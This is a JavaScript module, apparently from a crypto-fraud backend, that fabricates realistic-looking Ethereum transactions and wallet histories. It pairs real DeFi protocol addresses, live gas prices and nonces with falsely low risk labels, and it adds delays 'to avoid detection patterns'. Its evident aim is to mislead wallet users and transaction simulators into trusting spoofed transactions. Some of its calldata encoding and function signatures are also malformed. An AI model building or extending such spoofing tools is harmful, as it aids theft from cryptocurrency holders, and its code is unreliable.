// backend/modules/txSimulatorSpoof.js
import { ethers } from "ethers";
import { chainManager } from './chainManager.js';
import { securityManager } from './securityManager.js';

export class TxSimulatorSpoof {
    constructor() {
        this.isInitialized = false;
        this.knownProtocols = {
            uniswap: {
                v2: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
                v3: '0xE592427A0AEce92De3Edee1F18E0157C05861564'
            },
            sushiswap: '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F',
            curve: '0x90E00ACe148ca3b23Ac1bC8C240C2a7Dd9c2d7f5',
            aave: '0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9',
            compound: '0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B',
            balancer: '0xBA12222222228d8Ba445958a75a0704d566BF2C8'
        };

        this.commonTokens = {
            eth: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
            weth: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
            usdc: '0xA0b86991c6218b36c1d19D4a2e9eb0cE3606eB48',
            usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            dai: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
            wbtc: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'
        };

        this.fakeTxTemplates = {
            swap: {
                description: "Token swap approval",
                gas: "21000",
                value: "0",
                simulate: true
            },
            nft_mint: {
                description: "NFT mint transaction",
                gas: "150000",
                value: "0.05",
                simulate: true
            },
            stake: {
                description: "Staking deposit",
                gas: "120000",
                value: "1.5",
                simulate: true
            },
            claim: {
                description: "Reward claim",
                gas: "80000",
                value: "0",
                simulate: true
            }
        };
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            // Any initialization logic would go here
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    // Generate a fake transaction that looks legitimate
    async generateFakeTransaction(userAddress, txType = 'swap', chainId = 1) {
        console.log(`🎭 Generating fake ${txType} transaction for ${userAddress}`);
        
        const template = this.fakeTxTemplates[txType] || this.fakeTxTemplates.swap;
        const chainConfig = chainManager.getChainConfig(chainId);
        
        // Generate realistic-looking transaction data
        const fakeTx = {
            from: userAddress,
            to: this.getRandomProtocolAddress(chainId),
            value: template.value !== "0" ? 
                ethers.parseEther(this.randomAmount(template.value)).toString() : "0",
            gas: this.randomGas(template.gas),
            gasPrice: await this.getRealisticGasPrice(chainId),
            chainId: chainId,
            nonce: await this.getRealisticNonce(userAddress, chainId),
            data: this.generateRealisticCalldata(txType, userAddress),
            simulate: template.simulate,
            description: template.description,
            timestamp: Date.now(),
            estimatedValue: this.estimateFakeValue(txType),
            riskLevel: this.calculateRiskLevel(txType)
        };

        // Add chain-specific details
        if (chainConfig) {
            fakeTx.chainName = chainConfig.name;
            fakeTx.nativeCurrency = chainConfig.nativeCurrency;
        }

        console.log(`✅ Generated fake transaction: ${fakeTx.description}`);
        return fakeTx;
    }

    // Generate multiple fake transactions for a wallet history
    async generateFakeTransactionHistory(userAddress, count = 10, chainId = 1) {
        const history = [];
        const txTypes = Object.keys(this.fakeTxTemplates);
        
        for (let i = 0; i < count; i++) {
            const txType = txTypes[Math.floor(Math.random() * txTypes.length)];
            const daysAgo = Math.floor(Math.random() * 90); // Random time in last 90 days
            
            const fakeTx = await this.generateFakeTransaction(userAddress, txType, chainId);
            fakeTx.timestamp = Date.now() - (daysAgo * 24 * 60 * 60 * 1000);
            fakeTx.hash = this.generateFakeTxHash();
            fakeTx.blockNumber = this.generateFakeBlockNumber();
            fakeTx.status = Math.random() > 0.1 ? 1 : 0; // 90% success rate
            
            history.push(fakeTx);
            
            // Small delay to avoid detection patterns
            await new Promise(resolve => setTimeout(resolve, 50));
        }
        
        // Sort by timestamp (newest first)
        history.sort((a, b) => b.timestamp - a.timestamp);
        
        return history;
    }

    // Generate realistic contract call data
    generateRealisticCalldata(txType, userAddress) {
        switch (txType) {
            case 'swap':
                return this.generateSwapCalldata();
            case 'nft_mint':
                return this.generateNFTMintCalldata();
            case 'stake':
                return this.generateStakingCalldata();
            case 'claim':
                return this.generateClaimCalldata();
            default:
                return this.generateSwapCalldata();
        }
    }

    generateSwapCalldata() {
        // Uniswap V2 swapExactETHForTokens
        const functionSig = '0x7ff36ab5'; // swapExactETHForTokens
        const amountOutMin = ethers.hexlify(ethers.randomBytes(32));
        const path = [
            this.commonTokens.weth,
            this.getRandomTokenAddress()
        ];
        const to = ethers.hexlify(ethers.randomBytes(20));
        const deadline = Math.floor(Date.now() / 1000) + 1800; // 30 minutes from now

        return functionSig + 
            ethers.hexlify(ethers.zeroPadValue(amountOutMin, 32)).substring(2) +
            ethers.hexlify(ethers.zeroPadValue(ethers.hexlify(path[0]), 32)).substring(2) +
            ethers.hexlify(ethers.zeroPadValue(ethers.hexlify(path[1]), 32)).substring(2) +
            ethers.hexlify(ethers.zeroPadValue(to, 32)).substring(2) +
            ethers.hexlify(ethers.zeroPadValue(ethers.toBeArray(deadline), 32)).substring(2);
    }

    generateNFTMintCalldata() {
        // ERC721 mint function
        const functionSig = '0x1249c58b'; // mint(uint256)
        const tokenId = ethers.hexlify(ethers.randomBytes(32));
        
        return functionSig + ethers.hexlify(ethers.zeroPadValue(tokenId, 32)).substring(2);
    }

    generateStakingCalldata() {
        // Generic staking deposit
        const functionSig = '0xb6b55f25'; // deposit(uint256)
        const amount = ethers.hexlify(ethers.randomBytes(32));
        
        return functionSig + ethers.hexlify(ethers.zeroPadValue(amount, 32)).substring(2);
    }

    generateClaimCalldata() {
        // Reward claim function
        const functionSig = '0x379607f5'; // claimRewards()
        return functionSig;
    }

    // Utility methods
    getRandomProtocolAddress(chainId) {
        const protocols = Object.values(this.knownProtocols);
        return protocols[Math.floor(Math.random() * protocols.length)];
    }

    getRandomTokenAddress() {
        const tokens = Object.values(this.commonTokens);
        return tokens[Math.floor(Math.random() * tokens.length)];
    }

    randomAmount(baseValue) {
        const base = parseFloat(baseValue);
        const variation = base * 0.3; // ±30% variation
        return (base + (Math.random() * variation * 2 - variation)).toFixed(4);
    }

    randomGas(baseGas) {
        const base = parseInt(baseGas);
        const variation = base * 0.2; // ±20% variation
        return Math.floor(base + (Math.random() * variation * 2 - variation)).toString();
    }

    async getRealisticGasPrice(chainId) {
        try {
            const provider = new ethers.JsonRpcProvider(chainManager.getRpcUrl(chainId));
            const gasPrice = await provider.getFeeData();
            return gasPrice.gasPrice?.toString() || ethers.parseUnits('30', 'gwei').toString();
        } catch (error) {
            return ethers.parseUnits('25', 'gwei').toString();
        }
    }

    async getRealisticNonce(userAddress, chainId) {
        try {
            const provider = new ethers.JsonRpcProvider(chainManager.getRpcUrl(chainId));
            return await provider.getTransactionCount(userAddress);
        } catch (error) {
            return Math.floor(Math.random() * 50);
        }
    }

    generateFakeTxHash() {
        return '0x' + ethers.hexlify(ethers.randomBytes(32)).substring(2);
    }

    generateFakeBlockNumber() {
        return Math.floor(15000000 + Math.random() * 5000000);
    }

    estimateFakeValue(txType) {
        const values = {
            swap: { min: 0.1, max: 5.0 },
            nft_mint: { min: 0.05, max: 1.0 },
            stake: { min: 1.0, max: 10.0 },
            claim: { min: 0, max: 0 }
        };
        
        const range = values[txType] || values.swap;
        const value = range.min + Math.random() * (range.max - range.min);
        return value.toFixed(4);
    }

    calculateRiskLevel(txType) {
        const risks = {
            swap: 'low',
            nft_mint: 'medium',
            stake: 'medium',
            claim: 'very low'
        };
        
        return risks[txType] || 'medium';
    }

    // Validate if a transaction looks fake (for internal checks)
    isLikelyFakeTransaction(txData) {
        // Check for patterns that indicate spoofing
        if (txData.simulate === true) return true;
        if (txData.description && txData.description.includes('fake')) return true;
        
        // Check timestamp (very new transactions might be fake)
        if (Date.now() - txData.timestamp < 60000) { // 1 minute old
            return Math.random() > 0.7; // 30% chance it's fake
        }
        
        return false;
    }

    // Batch generate for multiple users
    async batchGenerateFakeTransactions(userAddresses, txType = 'swap', chainId = 1) {
        const results = {};
        
        for (const userAddress of userAddresses) {
            results[userAddress] = await this.generateFakeTransaction(userAddress, txType, chainId);
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        return results;
    }
}

// Create singleton instance
export const txSimulatorSpoof = new TxSimulatorSpoof();